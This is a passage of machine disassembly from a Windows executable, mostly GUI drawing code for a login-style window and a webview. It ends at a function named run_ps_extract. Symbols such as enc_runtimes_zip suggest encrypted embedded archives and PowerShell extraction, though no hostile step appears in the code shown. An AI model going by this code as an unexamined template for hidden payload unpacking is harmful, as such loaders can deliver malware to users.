   140002b7c:	c7 44 24 60 20 00 00 	movl   $0x20,0x60(%rsp)
   140002b83:	00 
   140002b84:	c7 44 24 58 05 00 00 	movl   $0x5,0x58(%rsp)
   140002b8b:	00 
   140002b8c:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140002b93:	00 
   140002b94:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140002b9b:	00 
   140002b9c:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140002ba3:	00 
   140002ba4:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140002bab:	00 
   140002bac:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002bb3:	00 
   140002bb4:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002bbb:	00 
   140002bbc:	c7 44 24 20 90 01 00 	movl   $0x190,0x20(%rsp)
   140002bc3:	00 
   140002bc4:	31 d2                	xor    %edx,%edx
   140002bc6:	45 31 c0             	xor    %r8d,%r8d
   140002bc9:	45 31 c9             	xor    %r9d,%r9d
   140002bcc:	ff d6                	call   *%rsi
   140002bce:	48 89 84 24 48 01 00 	mov    %rax,0x148(%rsp)
   140002bd5:	00 
   140002bd6:	8b 05 34 75 07 00    	mov    0x77534(%rip),%eax        # 14007a110 <S_WND_W>
   140002bdc:	2b 05 46 75 07 00    	sub    0x77546(%rip),%eax        # 14007a128 <S_CONTENT_W>
   140002be2:	89 c5                	mov    %eax,%ebp
   140002be4:	c1 ed 1f             	shr    $0x1f,%ebp
   140002be7:	01 c5                	add    %eax,%ebp
   140002be9:	d1 fd                	sar    $1,%ebp
   140002beb:	48 89 f9             	mov    %rdi,%rcx
   140002bee:	4c 89 e2             	mov    %r12,%rdx
   140002bf1:	4c 89 f6             	mov    %r14,%rsi
   140002bf4:	41 ff d6             	call   *%r14
   140002bf7:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140002bfe:	00 
   140002bff:	89 ac 24 a0 00 00 00 	mov    %ebp,0xa0(%rsp)
   140002c06:	c7 84 24 a4 00 00 00 	movl   $0x0,0xa4(%rsp)
   140002c0d:	00 00 00 00 
   140002c11:	8b 05 11 75 07 00    	mov    0x77511(%rip),%eax        # 14007a128 <S_CONTENT_W>
   140002c17:	01 e8                	add    %ebp,%eax
   140002c19:	89 84 24 a8 00 00 00 	mov    %eax,0xa8(%rsp)
   140002c20:	f3 0f 10 3d d0 34 00 	movss  0x34d0(%rip),%xmm7        # 1400060f8 <.refptr._newmode+0x68>
   140002c27:	00 
   140002c28:	f3 0f 10 05 d0 73 07 	movss  0x773d0(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002c2f:	00 
   140002c30:	f3 0f 59 c7          	mulss  %xmm7,%xmm0
   140002c34:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   140002c38:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   140002c3c:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
   140002c43:	48 8b 15 fe 74 07 00 	mov    0x774fe(%rip),%rdx        # 14007a148 <g_lang.0>
   140002c4a:	c7 44 24 20 11 04 00 	movl   $0x411,0x20(%rsp)
   140002c51:	00 
   140002c52:	48 8b 1d 77 4e 07 00 	mov    0x74e77(%rip),%rbx        # 140077ad0 <__imp_DrawTextW>
   140002c59:	4c 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%r9
   140002c60:	00 
   140002c61:	48 89 f9             	mov    %rdi,%rcx
   140002c64:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002c6a:	ff d3                	call   *%rbx
   140002c6c:	41 89 c6             	mov    %eax,%r14d
   140002c6f:	48 89 f9             	mov    %rdi,%rcx
   140002c72:	4c 89 fa             	mov    %r15,%rdx
   140002c75:	ff d6                	call   *%rsi
   140002c77:	89 ac 24 20 01 00 00 	mov    %ebp,0x120(%rsp)
   140002c7e:	c7 84 24 24 01 00 00 	movl   $0x0,0x124(%rsp)
   140002c85:	00 00 00 00 
   140002c89:	8b 05 99 74 07 00    	mov    0x77499(%rip),%eax        # 14007a128 <S_CONTENT_W>
   140002c8f:	01 e8                	add    %ebp,%eax
   140002c91:	89 84 24 28 01 00 00 	mov    %eax,0x128(%rsp)
   140002c98:	f3 0f 59 3d 60 73 07 	mulss  0x77360(%rip),%xmm7        # 14007a000 <g_dpiScale>
   140002c9f:	00 
   140002ca0:	f3 0f 58 fe          	addss  %xmm6,%xmm7
   140002ca4:	f3 0f 2c c7          	cvttss2si %xmm7,%eax
   140002ca8:	89 84 24 2c 01 00 00 	mov    %eax,0x12c(%rsp)
   140002caf:	48 8b 15 9a 74 07 00 	mov    0x7749a(%rip),%rdx        # 14007a150 <g_lang.1>
   140002cb6:	c7 44 24 20 11 04 00 	movl   $0x411,0x20(%rsp)
   140002cbd:	00 
   140002cbe:	4c 8d 8c 24 20 01 00 	lea    0x120(%rsp),%r9
   140002cc5:	00 
   140002cc6:	48 89 f9             	mov    %rdi,%rcx
   140002cc9:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002ccf:	ff d3                	call   *%rbx
   140002cd1:	f3 0f 10 05 27 73 07 	movss  0x77327(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002cd8:	00 
   140002cd9:	f3 0f 10 0d 1b 34 00 	movss  0x341b(%rip),%xmm1        # 1400060fc <.refptr._newmode+0x6c>
   140002ce0:	00 
   140002ce1:	f3 0f 59 c8          	mulss  %xmm0,%xmm1
   140002ce5:	f3 0f 58 ce          	addss  %xmm6,%xmm1
   140002ce9:	f3 0f 2c f1          	cvttss2si %xmm1,%esi
   140002ced:	f3 0f 59 05 0b 34 00 	mulss  0x340b(%rip),%xmm0        # 140006100 <.refptr._newmode+0x70>
   140002cf4:	00 
   140002cf5:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   140002cf9:	f3 44 0f 2c e8       	cvttss2si %xmm0,%r13d
   140002cfe:	41 89 c7             	mov    %eax,%r15d
   140002d01:	43 8d 04 37          	lea    (%r15,%r14,1),%eax
   140002d05:	03 05 19 74 07 00    	add    0x77419(%rip),%eax        # 14007a124 <S_LOGIN_H>
   140002d0b:	8b 0d 03 74 07 00    	mov    0x77403(%rip),%ecx        # 14007a114 <S_WND_H>
   140002d11:	01 f0                	add    %esi,%eax
   140002d13:	44 01 e8             	add    %r13d,%eax
   140002d16:	29 c1                	sub    %eax,%ecx
   140002d18:	89 cb                	mov    %ecx,%ebx
   140002d1a:	c1 eb 1f             	shr    $0x1f,%ebx
   140002d1d:	01 cb                	add    %ecx,%ebx
   140002d1f:	d1 fb                	sar    $1,%ebx
   140002d21:	48 89 f9             	mov    %rdi,%rcx
   140002d24:	4c 89 a4 24 50 01 00 	mov    %r12,0x150(%rsp)
   140002d2b:	00 
   140002d2c:	4c 89 e2             	mov    %r12,%rdx
   140002d2f:	ff 15 03 4f 07 00    	call   *0x74f03(%rip)        # 140077c38 <__imp_SelectObject>
   140002d35:	4c 8b 25 0c 4f 07 00 	mov    0x74f0c(%rip),%r12        # 140077c48 <__imp_SetTextColor>
   140002d3c:	48 89 f9             	mov    %rdi,%rcx
   140002d3f:	ba ff ff ff 00       	mov    $0xffffff,%edx
   140002d44:	41 ff d4             	call   *%r12
   140002d47:	89 ac 24 10 01 00 00 	mov    %ebp,0x110(%rsp)
   140002d4e:	89 9c 24 14 01 00 00 	mov    %ebx,0x114(%rsp)
   140002d55:	8b 05 cd 73 07 00    	mov    0x773cd(%rip),%eax        # 14007a128 <S_CONTENT_W>
   140002d5b:	01 e8                	add    %ebp,%eax
   140002d5d:	89 84 24 18 01 00 00 	mov    %eax,0x118(%rsp)
   140002d64:	44 01 f3             	add    %r14d,%ebx
   140002d67:	89 9c 24 1c 01 00 00 	mov    %ebx,0x11c(%rsp)
   140002d6e:	48 8b 15 d3 73 07 00 	mov    0x773d3(%rip),%rdx        # 14007a148 <g_lang.0>
   140002d75:	c7 44 24 20 11 00 00 	movl   $0x11,0x20(%rsp)
   140002d7c:	00 
   140002d7d:	4c 8d 8c 24 10 01 00 	lea    0x110(%rsp),%r9
   140002d84:	00 
   140002d85:	48 89 f9             	mov    %rdi,%rcx
   140002d88:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002d8e:	4c 8b 35 3b 4d 07 00 	mov    0x74d3b(%rip),%r14        # 140077ad0 <__imp_DrawTextW>
   140002d95:	41 ff d6             	call   *%r14
   140002d98:	48 89 f9             	mov    %rdi,%rcx
   140002d9b:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140002da0:	ff 15 92 4e 07 00    	call   *0x74e92(%rip)        # 140077c38 <__imp_SelectObject>
   140002da6:	48 89 f9             	mov    %rdi,%rcx
   140002da9:	ba c7 d5 e0 00       	mov    $0xe0d5c7,%edx
   140002dae:	41 ff d4             	call   *%r12
   140002db1:	01 f3                	add    %esi,%ebx
   140002db3:	89 ac 24 00 01 00 00 	mov    %ebp,0x100(%rsp)
   140002dba:	89 9c 24 04 01 00 00 	mov    %ebx,0x104(%rsp)
   140002dc1:	03 2d 61 73 07 00    	add    0x77361(%rip),%ebp        # 14007a128 <S_CONTENT_W>
   140002dc7:	89 ac 24 08 01 00 00 	mov    %ebp,0x108(%rsp)
   140002dce:	44 01 fb             	add    %r15d,%ebx
   140002dd1:	89 9c 24 0c 01 00 00 	mov    %ebx,0x10c(%rsp)
   140002dd8:	48 8b 15 71 73 07 00 	mov    0x77371(%rip),%rdx        # 14007a150 <g_lang.1>
   140002ddf:	c7 44 24 20 11 00 00 	movl   $0x11,0x20(%rsp)
   140002de6:	00 
   140002de7:	4c 8d 8c 24 00 01 00 	lea    0x100(%rsp),%r9
   140002dee:	00 
   140002def:	48 89 f9             	mov    %rdi,%rcx
   140002df2:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   140002df8:	41 ff d6             	call   *%r14
   140002dfb:	44 01 eb             	add    %r13d,%ebx
   140002dfe:	8b 05 0c 73 07 00    	mov    0x7730c(%rip),%eax        # 14007a110 <S_WND_W>
   140002e04:	8b 0d 16 73 07 00    	mov    0x77316(%rip),%ecx        # 14007a120 <S_LOGIN_W>
   140002e0a:	29 c8                	sub    %ecx,%eax
   140002e0c:	41 89 c7             	mov    %eax,%r15d
   140002e0f:	41 c1 ef 1f          	shr    $0x1f,%r15d
   140002e13:	41 01 c7             	add    %eax,%r15d
   140002e16:	41 d1 ff             	sar    $1,%r15d
   140002e19:	41 8d 04 0f          	lea    (%r15,%rcx,1),%eax
   140002e1d:	8b 15 01 73 07 00    	mov    0x77301(%rip),%edx        # 14007a124 <S_LOGIN_H>
   140002e23:	44 8d 04 1a          	lea    (%rdx,%rbx,1),%r8d
   140002e27:	44 89 3d b2 72 07 00 	mov    %r15d,0x772b2(%rip)        # 14007a0e0 <g+0x38>
   140002e2e:	89 1d b0 72 07 00    	mov    %ebx,0x772b0(%rip)        # 14007a0e4 <g+0x3c>
   140002e34:	89 05 ae 72 07 00    	mov    %eax,0x772ae(%rip)        # 14007a0e8 <g+0x40>
   140002e3a:	44 89 05 ab 72 07 00 	mov    %r8d,0x772ab(%rip)        # 14007a0ec <g+0x44>
   140002e41:	45 8d 44 0f 01       	lea    0x1(%r15,%rcx,1),%r8d
   140002e46:	f3 0f 10 05 b2 71 07 	movss  0x771b2(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002e4d:	00 
   140002e4e:	f3 0f 59 05 ae 32 00 	mulss  0x32ae(%rip),%xmm0        # 140006104 <.refptr._newmode+0x74>
   140002e55:	00 
   140002e56:	44 8d 4c 1a 01       	lea    0x1(%rdx,%rbx,1),%r9d
   140002e5b:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   140002e5f:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   140002e63:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002e67:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140002e6b:	44 89 f9             	mov    %r15d,%ecx
   140002e6e:	89 da                	mov    %ebx,%edx
   140002e70:	ff 15 82 4d 07 00    	call   *0x74d82(%rip)        # 140077bf8 <__imp_CreateRoundRectRgn>
   140002e76:	48 89 c5             	mov    %rax,%rbp
   140002e79:	48 89 f9             	mov    %rdi,%rcx
   140002e7c:	48 89 c2             	mov    %rax,%rdx
   140002e7f:	ff 15 ab 4d 07 00    	call   *0x74dab(%rip)        # 140077c30 <__imp_SelectClipRgn>
   140002e85:	8b 15 79 72 07 00    	mov    0x77279(%rip),%edx        # 14007a104 <g+0x5c>
   140002e8b:	85 d2                	test   %edx,%edx
   140002e8d:	b8 06 be ff 00       	mov    $0xffbe06,%eax
   140002e92:	b9 20 ce ff 00       	mov    $0xffce20,%ecx
   140002e97:	0f 44 c8             	cmove  %eax,%ecx
   140002e9a:	44 8b 25 7f 72 07 00 	mov    0x7727f(%rip),%r12d        # 14007a120 <S_LOGIN_W>
   140002ea1:	8b 35 7d 72 07 00    	mov    0x7727d(%rip),%esi        # 14007a124 <S_LOGIN_H>
   140002ea7:	48 8b 05 8a 72 07 00 	mov    0x7728a(%rip),%rax        # 14007a138 <pfGF>
   140002eae:	48 85 c0             	test   %rax,%rax
   140002eb1:	0f 84 c0 00 00 00    	je     140002f77 <MainProc+0xd37>
   140002eb7:	41 89 c8             	mov    %ecx,%r8d
   140002eba:	41 c1 e0 08          	shl    $0x8,%r8d
   140002ebe:	81 e1 00 fe 00 00    	and    $0xfe00,%ecx
   140002ec4:	45 01 fc             	add    %r15d,%r12d
   140002ec7:	01 de                	add    %ebx,%esi
   140002ec9:	85 d2                	test   %edx,%edx
   140002ecb:	48 ba 00 00 00 00 01 	movabs $0x100000000,%rdx
   140002ed2:	00 00 00 
   140002ed5:	48 89 94 24 78 01 00 	mov    %rdx,0x178(%rsp)
   140002edc:	00 
   140002edd:	44 89 bc 24 80 00 00 	mov    %r15d,0x80(%rsp)
   140002ee4:	00 
   140002ee5:	89 9c 24 84 00 00 00 	mov    %ebx,0x84(%rsp)
   140002eec:	66 44 89 84 24 88 00 	mov    %r8w,0x88(%rsp)
   140002ef3:	00 00 
   140002ef5:	66 89 8c 24 8a 00 00 	mov    %cx,0x8a(%rsp)
   140002efc:	00 
   140002efd:	c7 84 24 8c 00 00 00 	movl   $0xff00,0x8c(%rsp)
   140002f04:	00 ff 00 00 
   140002f08:	44 89 a4 24 90 00 00 	mov    %r12d,0x90(%rsp)
   140002f0f:	00 
   140002f10:	89 b4 24 94 00 00 00 	mov    %esi,0x94(%rsp)
   140002f17:	b9 2d 73 00 00       	mov    $0x732d,%ecx
   140002f1c:	ba 45 85 00 00       	mov    $0x8545,%edx
   140002f21:	0f 44 d1             	cmove  %ecx,%edx
   140002f24:	89 d1                	mov    %edx,%ecx
   140002f26:	c1 e1 08             	shl    $0x8,%ecx
   140002f29:	66 89 8c 24 98 00 00 	mov    %cx,0x98(%rsp)
   140002f30:	00 
   140002f31:	81 e2 00 f7 00 00    	and    $0xf700,%edx
   140002f37:	66 89 94 24 9a 00 00 	mov    %dx,0x9a(%rsp)
   140002f3e:	00 
   140002f3f:	c7 84 24 9c 00 00 00 	movl   $0xff00,0x9c(%rsp)
   140002f46:	00 ff 00 00 
   140002f4a:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002f51:	00 
   140002f52:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140002f59:	00 
   140002f5a:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140002f61:	00 
   140002f62:	4c 8d 8c 24 78 01 00 	lea    0x178(%rsp),%r9
   140002f69:	00 
   140002f6a:	48 89 f9             	mov    %rdi,%rcx
   140002f6d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140002f73:	ff d0                	call   *%rax
   140002f75:	eb 49                	jmp    140002fc0 <MainProc+0xd80>
   140002f77:	ff 15 83 4c 07 00    	call   *0x74c83(%rip)        # 140077c00 <__imp_CreateSolidBrush>
   140002f7d:	49 89 c6             	mov    %rax,%r14
   140002f80:	44 89 bc 24 80 00 00 	mov    %r15d,0x80(%rsp)
   140002f87:	00 
   140002f88:	89 9c 24 84 00 00 00 	mov    %ebx,0x84(%rsp)
   140002f8f:	45 01 fc             	add    %r15d,%r12d
   140002f92:	44 89 a4 24 88 00 00 	mov    %r12d,0x88(%rsp)
   140002f99:	00 
   140002f9a:	01 de                	add    %ebx,%esi
   140002f9c:	89 b4 24 8c 00 00 00 	mov    %esi,0x8c(%rsp)
   140002fa3:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140002faa:	00 
   140002fab:	48 89 f9             	mov    %rdi,%rcx
   140002fae:	49 89 c0             	mov    %rax,%r8
   140002fb1:	ff 15 29 4b 07 00    	call   *0x74b29(%rip)        # 140077ae0 <__imp_FillRect>
   140002fb7:	4c 89 f1             	mov    %r14,%rcx
   140002fba:	ff 15 50 4c 07 00    	call   *0x74c50(%rip)        # 140077c10 <__imp_DeleteObject>
   140002fc0:	45 31 f6             	xor    %r14d,%r14d
   140002fc3:	48 89 f9             	mov    %rdi,%rcx
   140002fc6:	31 d2                	xor    %edx,%edx
   140002fc8:	ff 15 62 4c 07 00    	call   *0x74c62(%rip)        # 140077c30 <__imp_SelectClipRgn>
   140002fce:	4c 8b 25 3b 4c 07 00 	mov    0x74c3b(%rip),%r12        # 140077c10 <__imp_DeleteObject>
   140002fd5:	48 89 e9             	mov    %rbp,%rcx
   140002fd8:	41 ff d4             	call   *%r12
   140002fdb:	48 89 f9             	mov    %rdi,%rcx
   140002fde:	4c 8b ac 24 48 01 00 	mov    0x148(%rsp),%r13
   140002fe5:	00 
   140002fe6:	4c 89 ea             	mov    %r13,%rdx
   140002fe9:	48 8b 35 48 4c 07 00 	mov    0x74c48(%rip),%rsi        # 140077c38 <__imp_SelectObject>
   140002ff0:	ff d6                	call   *%rsi
   140002ff2:	48 89 f9             	mov    %rdi,%rcx
   140002ff5:	ba ff ff ff 00       	mov    $0xffffff,%edx
   140002ffa:	ff 15 48 4c 07 00    	call   *0x74c48(%rip)        # 140077c48 <__imp_SetTextColor>
   140003000:	44 89 bc 24 80 00 00 	mov    %r15d,0x80(%rsp)
   140003007:	00 
   140003008:	89 9c 24 84 00 00 00 	mov    %ebx,0x84(%rsp)
   14000300f:	44 03 3d 0a 71 07 00 	add    0x7710a(%rip),%r15d        # 14007a120 <S_LOGIN_W>
   140003016:	44 89 bc 24 88 00 00 	mov    %r15d,0x88(%rsp)
   14000301d:	00 
   14000301e:	03 1d 00 71 07 00    	add    0x77100(%rip),%ebx        # 14007a124 <S_LOGIN_H>
   140003024:	89 9c 24 8c 00 00 00 	mov    %ebx,0x8c(%rsp)
   14000302b:	48 8b 15 26 71 07 00 	mov    0x77126(%rip),%rdx        # 14007a158 <g_lang.2>
   140003032:	c7 44 24 20 25 00 00 	movl   $0x25,0x20(%rsp)
   140003039:	00 
   14000303a:	4c 8d 8c 24 80 00 00 	lea    0x80(%rsp),%r9
   140003041:	00 
   140003042:	48 89 f9             	mov    %rdi,%rcx
   140003045:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   14000304b:	ff 15 7f 4a 07 00    	call   *0x74a7f(%rip)        # 140077ad0 <__imp_DrawTextW>
   140003051:	48 89 f9             	mov    %rdi,%rcx
   140003054:	48 8b 94 24 40 01 00 	mov    0x140(%rsp),%rdx
   14000305b:	00 
   14000305c:	ff d6                	call   *%rsi
   14000305e:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   140003065:	00 
   140003066:	41 ff d4             	call   *%r12
   140003069:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000306e:	41 ff d4             	call   *%r12
   140003071:	4c 89 e9             	mov    %r13,%rcx
   140003074:	41 ff d4             	call   *%r12
   140003077:	44 8b 8c 24 38 01 00 	mov    0x138(%rsp),%r9d
   14000307e:	00 
   14000307f:	8b 84 24 3c 01 00 00 	mov    0x13c(%rsp),%eax
   140003086:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000308b:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000308f:	c7 44 24 40 20 00 cc 	movl   $0xcc0020,0x40(%rsp)
   140003096:	00 
   140003097:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   14000309e:	00 
   14000309f:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   1400030a6:	00 
   1400030a7:	48 8b 8c 24 68 01 00 	mov    0x168(%rsp),%rcx
   1400030ae:	00 
   1400030af:	31 d2                	xor    %edx,%edx
   1400030b1:	45 31 c0             	xor    %r8d,%r8d
   1400030b4:	ff 15 0e 4b 07 00    	call   *0x74b0e(%rip)        # 140077bc8 <__imp_BitBlt>
   1400030ba:	48 89 f9             	mov    %rdi,%rcx
   1400030bd:	48 8b 94 24 58 01 00 	mov    0x158(%rsp),%rdx
   1400030c4:	00 
   1400030c5:	ff d6                	call   *%rsi
   1400030c7:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   1400030ce:	00 
   1400030cf:	41 ff d4             	call   *%r12
   1400030d2:	48 89 f9             	mov    %rdi,%rcx
   1400030d5:	ff 15 2d 4b 07 00    	call   *0x74b2d(%rip)        # 140077c08 <__imp_DeleteDC>
   1400030db:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   1400030e2:	00 
   1400030e3:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   1400030ea:	00 
   1400030eb:	ff 15 e7 49 07 00    	call   *0x749e7(%rip)        # 140077ad8 <__imp_EndPaint>
   1400030f1:	e9 b2 01 00 00       	jmp    1400032a8 <MainProc+0x1068>
   1400030f6:	80 3d ab 74 07 00 00 	cmpb   $0x0,0x774ab(%rip)        # 14007a5a8 <show_webview.reg>
   1400030fd:	0f 85 95 00 00 00    	jne    140003198 <MainProc+0xf58>
   140003103:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003106:	0f 29 84 24 b0 00 00 	movaps %xmm0,0xb0(%rsp)
   14000310d:	00 
   14000310e:	0f 29 84 24 c0 00 00 	movaps %xmm0,0xc0(%rsp)
   140003115:	00 
   140003116:	0f 29 84 24 d0 00 00 	movaps %xmm0,0xd0(%rsp)
   14000311d:	00 
   14000311e:	0f 29 84 24 f0 00 00 	movaps %xmm0,0xf0(%rsp)
   140003125:	00 
   140003126:	0f 29 84 24 e0 00 00 	movaps %xmm0,0xe0(%rsp)
   14000312d:	00 
   14000312e:	c7 84 24 b0 00 00 00 	movl   $0x50,0xb0(%rsp)
   140003135:	50 00 00 00 
   140003139:	48 8d 05 00 03 00 00 	lea    0x300(%rip),%rax        # 140003440 <WVProc>
   140003140:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
   140003147:	00 
   140003148:	48 89 bc 24 c8 00 00 	mov    %rdi,0xc8(%rsp)
   14000314f:	00 
   140003150:	48 8b 05 61 6f 07 00 	mov    0x76f61(%rip),%rax        # 14007a0b8 <g+0x10>
   140003157:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   14000315e:	00 
   14000315f:	ba 00 7f 00 00       	mov    $0x7f00,%edx
   140003164:	31 c9                	xor    %ecx,%ecx
   140003166:	ff 15 c4 49 07 00    	call   *0x749c4(%rip)        # 140077b30 <__imp_LoadCursorW>
   14000316c:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   140003173:	00 
   140003174:	48 8d 05 11 f9 06 00 	lea    0x6f911(%rip),%rax        # 140072a8c <enc_runtimes_zip+0x3415c>
   14000317b:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   140003182:	00 
   140003183:	48 8d 8c 24 b0 00 00 	lea    0xb0(%rsp),%rcx
   14000318a:	00 
   14000318b:	ff 15 c7 49 07 00    	call   *0x749c7(%rip)        # 140077b58 <__imp_RegisterClassExW>
   140003191:	c6 05 10 74 07 00 01 	movb   $0x1,0x77410(%rip)        # 14007a5a8 <show_webview.reg>
   140003198:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   14000319f:	00 
   1400031a0:	4c 89 e1             	mov    %r12,%rcx
   1400031a3:	ff 15 67 49 07 00    	call   *0x74967(%rip)        # 140077b10 <__imp_GetWindowRect>
   1400031a9:	8b 8c 24 b0 00 00 00 	mov    0xb0(%rsp),%ecx
   1400031b0:	03 8c 24 b8 00 00 00 	add    0xb8(%rsp),%ecx
   1400031b7:	8b 94 24 b4 00 00 00 	mov    0xb4(%rsp),%edx
   1400031be:	8b 05 68 6f 07 00    	mov    0x76f68(%rip),%eax        # 14007a12c <S_WV_W>
   1400031c4:	29 c1                	sub    %eax,%ecx
   1400031c6:	41 89 c8             	mov    %ecx,%r8d
   1400031c9:	41 c1 e8 1f          	shr    $0x1f,%r8d
   1400031cd:	41 01 c8             	add    %ecx,%r8d
   1400031d0:	03 94 24 bc 00 00 00 	add    0xbc(%rsp),%edx
   1400031d7:	41 d1 f8             	sar    $1,%r8d
   1400031da:	8b 0d 50 6f 07 00    	mov    0x76f50(%rip),%ecx        # 14007a130 <S_WV_H>
   1400031e0:	29 ca                	sub    %ecx,%edx
   1400031e2:	41 89 d1             	mov    %edx,%r9d
   1400031e5:	41 c1 e9 1f          	shr    $0x1f,%r9d
   1400031e9:	41 01 d1             	add    %edx,%r9d
   1400031ec:	41 d1 f9             	sar    $1,%r9d
   1400031ef:	48 c7 05 96 6f 07 00 	movq   $0x0,0x76f96(%rip)        # 14007a190 <g_wv+0x30>
   1400031f6:	00 00 00 00 
   1400031fa:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400031fd:	0f 11 05 6c 6f 07 00 	movups %xmm0,0x76f6c(%rip)        # 14007a170 <g_wv+0x10>
   140003204:	0f 11 05 71 6f 07 00 	movups %xmm0,0x76f71(%rip)        # 14007a17c <g_wv+0x1c>
   14000320b:	4c 89 25 56 6f 07 00 	mov    %r12,0x76f56(%rip)        # 14007a168 <g_wv+0x8>
   140003212:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140003217:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000321c:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140003220:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140003224:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140003229:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000322e:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140003235:	00 00 
   140003237:	48 8d 15 4e f8 06 00 	lea    0x6f84e(%rip),%rdx        # 140072a8c <enc_runtimes_zip+0x3415c>
   14000323e:	4c 8d 05 19 3c 01 00 	lea    0x13c19(%rip),%r8        # 140016e5e <enc_ico_data+0x96ae>
   140003245:	45 31 f6             	xor    %r14d,%r14d
   140003248:	31 c9                	xor    %ecx,%ecx
   14000324a:	41 b9 00 00 cf 10    	mov    $0x10cf0000,%r9d
   140003250:	ff 15 52 48 07 00    	call   *0x74852(%rip)        # 140077aa8 <__imp_CreateWindowExW>
   140003256:	eb 50                	jmp    1400032a8 <MainProc+0x1068>
   140003258:	48 8d 0d 91 6e 07 00 	lea    0x76e91(%rip),%rcx        # 14007a0f0 <g+0x48>
   14000325f:	48 89 da             	mov    %rbx,%rdx
   140003262:	ff 15 e8 48 07 00    	call   *0x748e8(%rip)        # 140077b50 <__imp_PtInRect>
   140003268:	85 c0                	test   %eax,%eax
   14000326a:	4d 89 f1             	mov    %r14,%r9
   14000326d:	49 89 f0             	mov    %rsi,%r8
   140003270:	74 28                	je     14000329a <MainProc+0x105a>
   140003272:	ff 15 e8 48 07 00    	call   *0x748e8(%rip)        # 140077b60 <__imp_ReleaseCapture>
   140003278:	45 31 f6             	xor    %r14d,%r14d
   14000327b:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003281:	4c 89 e1             	mov    %r12,%rcx
   140003284:	ba a1 00 00 00       	mov    $0xa1,%edx
   140003289:	45 31 c9             	xor    %r9d,%r9d
   14000328c:	ff 15 e6 48 07 00    	call   *0x748e6(%rip)        # 140077b78 <__imp_SendMessageW>
   140003292:	eb 14                	jmp    1400032a8 <MainProc+0x1068>
   140003294:	4d 89 f9             	mov    %r15,%r9
   140003297:	49 89 f0             	mov    %rsi,%r8
   14000329a:	4c 89 e1             	mov    %r12,%rcx
   14000329d:	89 fa                	mov    %edi,%edx
   14000329f:	ff 15 0b 48 07 00    	call   *0x7480b(%rip)        # 140077ab0 <__imp_DefWindowProcW>
   1400032a5:	49 89 c6             	mov    %rax,%r14
   1400032a8:	4c 89 f0             	mov    %r14,%rax
   1400032ab:	0f 28 b4 24 80 01 00 	movaps 0x180(%rsp),%xmm6
   1400032b2:	00 
   1400032b3:	0f 28 bc 24 90 01 00 	movaps 0x190(%rsp),%xmm7
   1400032ba:	00 
   1400032bb:	48 81 c4 a8 01 00 00 	add    $0x1a8,%rsp
   1400032c2:	5b                   	pop    %rbx
   1400032c3:	5d                   	pop    %rbp
   1400032c4:	5f                   	pop    %rdi
   1400032c5:	5e                   	pop    %rsi
   1400032c6:	41 5c                	pop    %r12
   1400032c8:	41 5d                	pop    %r13
   1400032ca:	41 5e                	pop    %r14
   1400032cc:	41 5f                	pop    %r15
   1400032ce:	c3                   	ret
   1400032cf:	90                   	nop

00000001400032d0 <run_ps_extract>:
   1400032d0:	56                   	push   %rsi
   1400032d1:	57                   	push   %rdi
   1400032d2:	53                   	push   %rbx
   1400032d3:	b8 00 13 00 00       	mov    $0x1300,%eax
   1400032d8:	e8 f7 14 00 00       	call   1400047d4 <___chkstk_ms>
   1400032dd:	48 29 c4             	sub    %rax,%rsp
